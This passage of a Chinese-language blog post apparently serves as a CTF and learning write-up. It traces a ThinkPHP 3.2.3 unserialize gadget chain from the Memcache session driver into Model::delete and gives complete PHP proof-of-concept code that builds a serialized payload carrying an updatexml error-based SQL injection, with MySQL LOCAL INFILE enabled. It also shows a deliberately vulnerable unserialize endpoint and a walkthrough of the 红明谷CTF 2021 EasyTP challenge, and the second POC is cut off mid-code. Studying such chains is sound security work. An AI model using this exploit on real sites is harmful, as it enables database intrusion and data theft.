src="https://img-blog.csdnimg.cn/70873ffb5d064dcda923860589d36cba.png" alt="在这里插入图片描述"></p><p>其中的**$this-&gt;handle<strong>和</strong>$this-&gt;sessionName<strong>是可控的,然后调用了</strong>delete**函数，跟进到<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/937536a6d41b4b12b9ed7ab1ac3e53a1.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>调用了<strong>getPk</strong>函数</p><p><img src="https://img-blog.csdnimg.cn/02aa31995b6b45b3b688518cf76b20de.png" alt="在这里插入图片描述"></p><p><strong>$this-&gt;pk</strong>可控，所以**$pk**是可控的，接着看下面</p><p><img src="https://img-blog.csdnimg.cn/b39eef92507b47ebae9efc85fdc1fe54.png" alt="在这里插入图片描述"></p><p>再次调用<strong>delete</strong>函数,这次跟进到<code>ThinkPHP/Library/Think/Db/Driver.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/73b5e5800c62482f8486814f77d535e4.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>关键的是这段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><strong>$sql</strong>是由**’DELETE FROM ‘<strong>与</strong>$table<strong>拼接而来的，而</strong>$table<strong>等于的是调用了</strong>parseTable**方法后的值</p><p>跟进<strong>parseTable</strong>方法</p><p><img src="https://img-blog.csdnimg.cn/0eee7cdb4a684f389409747b8f3fac32.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>调用了<strong>parseKey</strong>方法，跟进</p><p><img src="https://img-blog.csdnimg.cn/84ebcabf1b044f0184a20a9a1cf37b2a.png" alt="在这里插入图片描述"></p><p>直接返回**$key<strong>，退回到<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>中的</strong>delete**方法</p><p>最后调用了<strong>execute</strong>方法对**$sql**进行处理</p><p><img src="https://img-blog.csdnimg.cn/918fcda2f0344afa852db8f80c2a483b.png" alt="在这里插入图片描述"></p><p>跟进一下</p><p><img src="https://img-blog.csdnimg.cn/bcba9ca8f977490594b9ce3d9e89aab4.png" alt="在这里插入图片描述"></p><p>调用了<strong>initConnect</strong>方法，跟进</p><p><img src="https://img-blog.csdnimg.cn/40175316603e4888946b6def6d9d8c67.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>调用了<strong>connect</strong>函数，跟进</p><p><img src="https://img-blog.csdnimg.cn/3f9cd888cb0c40b2b0a541b9a217d93e.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>这里使用了**$this-&gt;config<strong>去创建数据库的连接，所以在</strong>mysql**类下配置好数据库的配置即可</p><p><img src="https://img-blog.csdnimg.cn/e6ee35f789194e2dac653c48cda46054.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>梳理一下思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ThinkPHP/Mode/Lite/Model.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$pk</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>();    </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]);<span class="comment">//$pk可控，$this-&gt;data可控，所以$this-&gt;data[$pk]可控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)//这里的$<span class="title">options</span>就是上面的$<span class="title">this</span>-&gt;<span class="title">data</span>[$<span class="title">pk</span>]，可控</span></span><br><span class="line"><span class="function">$<span class="title">table</span> = $<span class="title">this</span>-&gt;<span class="title">parseTable</span>(<span class="params"><span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]</span>)</span>;</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span>(<span class="params"><span class="variable">$tables</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"><span class="comment">// 支持别名定义</span></span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$table</span> =&gt; <span class="variable">$alias</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$table</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="variable">$array</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_walk</span>(<span class="variable">$tables</span>, <span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="string">&#x27;parseKey&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params">&amp;<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于整个执行过程可以看下面的例子，很好懂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wind</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;pk;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) //这里的$<span class="title">options</span>就是上面的$<span class="title">this</span>-&gt;<span class="title">data</span>[$<span class="title">pk</span>]，可控</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;test sql&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params">&amp;<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span>(<span class="params"><span class="variable">$tables</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"><span class="comment">// 支持别名定义</span></span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$table</span> =&gt; <span class="variable">$alias</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$table</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="variable">$array</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$tables</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_walk</span>(<span class="variable">$tables</span>, <span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="string">&#x27;parseKey&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">wind</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果：</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;test sql&quot;</span></span><br></pre></td></tr></table></figure><p>所以我们可以构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;name where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br></pre></td></tr></table></figure><p>来进行报错注入</p><p>最后的POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//初始化数据库连接</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span>    <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,<span class="comment">//数据库名</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,<span class="comment">//地址</span></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,<span class="comment">//端口</span></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,<span class="comment">//用户名</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span><span class="comment">//密码</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;name where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>\<span class="title class_">Imagick</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在入口文件处添加如下代码以测试,在实际应用中，就是因为出现了可利用点，才能通过漏洞进行一系列操作</p><p><strong>IndexController.class.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line">    &#125;   </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d1f655cd8e3d480891710c4eae74e309.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="例题实操"><a href="#例题实操" class="headerlink" title="例题实操"></a>例题实操</h2><h3 id="BUU-红明谷CTF-2021-EasyTP"><a href="#BUU-红明谷CTF-2021-EasyTP" class="headerlink" title="BUU [红明谷CTF 2021]EasyTP"></a>BUU [红明谷CTF 2021]EasyTP</h3><p>启动题目</p><p><img src="https://img-blog.csdnimg.cn/1f6cfbd34a1b45cbb4ec35eeb651ae18.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>一张图片，查看源码，没发现特殊的地方，<strong>dirsearch</strong>扫目录，发现<strong><a href="http://www.zip/">www.zip</a></strong>文件备份</p><p>down下来，发现是<strong>tp3.2.3</strong>，访问<strong>localhost&#x2F;tp3.2.3</strong>以生成本地文件，来到<code>\tp3.2.3\Application\Home\Controller\IndexController.class.php</code>，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">display</span>();</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接使用<strong>test</strong>方法，因为<strong>index</strong>方法还调用了<strong>display</strong>函数，这个题只是改了首页即<strong>IndexController.class.php</strong>，更改其利用方式为<code>php://input</code>，其他和上述讲的完全一样</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span> <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        